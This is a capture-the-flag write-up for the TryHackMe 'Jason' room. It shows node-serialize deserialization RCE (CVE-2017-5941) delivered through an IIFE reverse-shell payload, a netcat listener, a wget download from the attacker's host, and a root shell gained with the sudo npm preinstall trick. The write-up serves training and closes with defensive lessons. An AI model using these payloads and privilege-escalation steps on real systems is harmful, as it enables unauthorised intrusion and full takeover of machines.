# TryHackMe — Jax Sucks Alot (Jason)

**Platform:** TryHackMe  
**Room:** [Jax sucks alot.....](https://tryhackme.com/room/jason)  
**Target IP:** 10.49.168.87  
**Difficulty:** Easy  
**Category:** Web, Node.js Deserialization, Privilege Escalation  
**CVE:** CVE-2017-5941 (`node-serialize` RCE)

---

## Overview

![TryHackMe Jax Sucks A Lot](/images/writeups/tryhackme/JaxSucksAlot/jaxtitle.jpeg)

This room exploits a Node.js web application ("Horror LLC") that is vulnerable to insecure deserialization. User input is serialized into JSON, base64-encoded, and stored in a `session` cookie. The server passes this cookie directly to `node-serialize`'s `unserialize()` function — allowing RCE via an Immediately Invoked Function Expression (IIFE) payload. Privilege escalation abuses a `sudo NOPASSWD` misconfiguration on `/usr/bin/npm`.

**Attack chain:** Ping → RustScan → Nmap → Feroxbuster → Burp (cookie analysis) → `nodejsshell.py` CharCode payload → IIFE injection → Reverse shell → Shell upgrade → LinPEAS → `sudo npm` → Root

---

## 1. Reconnaissance

### 1.1 Ping

Confirm the target is alive:

```bash
ping 10.49.168.87 -c 5
```

### 1.2 All-Port Scan (RustScan)

```bash
rustscan -a 10.49.168.87 --ulimit 5000
```

**Open ports:**

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

### 1.3 Aggressive Nmap Scan

```bash
nmap -sC -sV -A -T5 -n -Pn -p 22,80 -o aggressiveScan.txt 10.49.168.87
```

Two services confirmed: SSH (22) and HTTP (80). Focus goes to the web app.

---

## 2. Web Enumeration

### 2.1 Directory Fuzzing

```bash
feroxbuster --url http://10.49.168.87 -t 200
```

No hidden directories found. The application is a single-page Node.js app.

### 2.2 Web Application

Navigating to `http://10.49.168.87` reveals **Horror LLC** — a coming-soon page built with Node.js, featuring a single email newsletter signup field.

Submitting a test email (`test@test.com`) reflects it back on the page:

```
We'll keep you updated at: test@test.com
```

XSS attempts don't work. Moving to Burp.

---

## 3. Cookie Analysis (Burp Suite)

Intercepting the POST request in Burp Suite reveals two requests:

- `POST /?email=test@test.com` — submits the email
- `GET /` — loads the page with the new `session` cookie

The response sets a `session` cookie. Decoding it in **Burp Decoder** (Base64 → plain text):

```json
{"email":"test@test.com"}
```

The user-supplied email is serialized into JSON, base64-encoded, and stored in the cookie. The server deserializes it on the next request and reflects the value into the page — classic `node-serialize` insecure deserialization.

> **Why this is dangerous:** `node-serialize`'s `unserialize()` evaluates the `_$$ND_FUNC$$_` prefix as a JavaScript function. Appending `()` makes it an IIFE — executing arbitrary code the moment the cookie is deserialized.

**CVE:** [CVE-2017-5941](https://nvd.nist.gov/vuln/detail/CVE-2017-5941) — CVSS 9.8 Critical  
**ExploitDB:** [EDB-50036](https://www.exploit-db.com/exploits/50036)  
**Reference:** [opsecx.com — Exploiting Node.js Deserialization Bug for RCE](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)

---

## 4. Gaining Access — Deserialization RCE

### 4.1 Generate the Payload

Use `nodejsshell.py` to generate a CharCode-encoded Node.js reverse shell:

```bash
python2 nodejsshell.py <YOUR_TUN0_IP> 9001
```

**Output:**

```
[+] LHOST = <YOUR_TUN0_IP>
[+] LPORT = 9001
[+] Encoding
eval(String.fromCharCode(10,118,97,114,...))
```

The script encodes the entire reverse shell as a `String.fromCharCode(...)` sequence, bypassing any character-level filtering.

### 4.2 Wrap in IIFE

Place the generated `eval(String.fromCharCode(...))` string inside the IIFE wrapper that triggers deserialization:

```
_$$ND_FUNC$$_function(){eval(String.fromCharCode(...YOUR_CHARCODE...))}()
```

This becomes the value for the `email` field when submitted via the form.

### 4.3 Start Listener

```bash
nc -lnvp 9001
```

### 4.4 Deliver the Payload

Paste the full IIFE string into the email input field and hit **SUBMIT**.

**Shell received:**

```
nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.49.168.87 40230
Connected!
id
uid=1000(dylan) gid=1000(dylan) groups=1000(dylan)
```

---

## 5. Shell Upgrade

Upgrade the dumb shell to a full interactive TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z to background
stty raw -echo; fg
export TERM=xterm
```

Webapp files visible at `/opt/webapp`:

```
index.html  node_modules  package.json  package-lock.json  server.js
```

---

## 6. User Flag

```bash
cd ~
ls -al
cat user.txt
```

**Flag:** `THM{<user_flag>}`

---

## 7. Privilege Escalation

### 7.1 SUID Check

```bash
find / -perm -u=s -type f 2>/dev/null
```

Standard SUID binaries only — nothing unusual.

### 7.2 LinPEAS

Transfer and run LinPEAS for automated enumeration:

```bash
# On attacker machine
python3 -m http.server 80

# On target
cd /tmp
wget http://<YOUR_TUN0_IP>/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

LinPEAS flags the sudo entry immediately:

```
User dylan may run the following commands on jason:
    (ALL) NOPASSWD: /usr/bin/npm *
```

### 7.3 sudo -l Confirmation

```bash
sudo -l
```

```
Matching Defaults entries for dylan on jason:
    env_reset, mail_badpass, secure_path=...

User dylan may run the following commands on jason:
    (ALL) NOPASSWD: /usr/bin/npm *
```

### 7.4 GTFOBins — npm privesc

`npm` executes `preinstall` lifecycle scripts during package install. With `sudo NOPASSWD`, this spawns a root shell.

```bash
TF=$(mktemp -d)
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
sudo npm -C $TF --unsafe-perm i
```

**Root shell:**

```
> @ preinstall /tmp/tmp.OOelTCd0P9
> /bin/sh

# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## 8. Root Flag

```bash
ls -al /root
cat /root/root.txt
```

**Flag:** `THM{<root_flag>}`

---

## Summary

| Step | Command / Tool | Finding |
|------|---------------|---------|
| Host discovery | `ping`, `rustscan` | Target alive, ports 22 & 80 open |
| Service scan | `nmap -sC -sV -A` | SSH + Node.js HTTP |
| Dir fuzzing | `feroxbuster` | No hidden directories |
| Cookie analysis | Burp Suite Decoder | `session` = base64 JSON of user input |
| Payload gen | `nodejsshell.py` | CharCode-encoded reverse shell |
| Initial access | IIFE deserialization | Shell as `dylan` |
| Shell upgrade | `python3 pty` + `stty` | Full TTY |
| PrivEsc recon | `find SUID` + `linpeas.sh` | `sudo npm NOPASSWD` |
| Root | GTFOBins npm `preinstall` | Shell as root |

---

## Key Takeaways

- **Never deserialize untrusted user input.** The `node-serialize` module is inherently unsafe for cookies or any user-controlled data.
- **CharCode encoding** (`eval(String.fromCharCode(...))`) is an effective bypass for input filters that block shell metacharacters.
- **`sudo` misconfigurations** on package managers (`npm`, `pip`, `gem`) are trivially exploitable — all support lifecycle hooks that execute arbitrary commands.
- Always check `sudo -l` **before** reaching for LinPEAS — it's a 2-second check that often ends the room.
- Check [GTFOBins](https://gtfobins.github.io) for any binary appearing in `sudo -l` output.

---

## References

- [CVE-2017-5941 — node-serialize RCE](https://nvd.nist.gov/vuln/detail/CVE-2017-5941)
- [ExploitDB EDB-50036](https://www.exploit-db.com/exploits/50036)
- [opsecx.com — Exploiting Node.js Deserialization Bug for RCE](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)
- [GTFOBins — npm](https://gtfobins.github.io/gtfobins/npm/)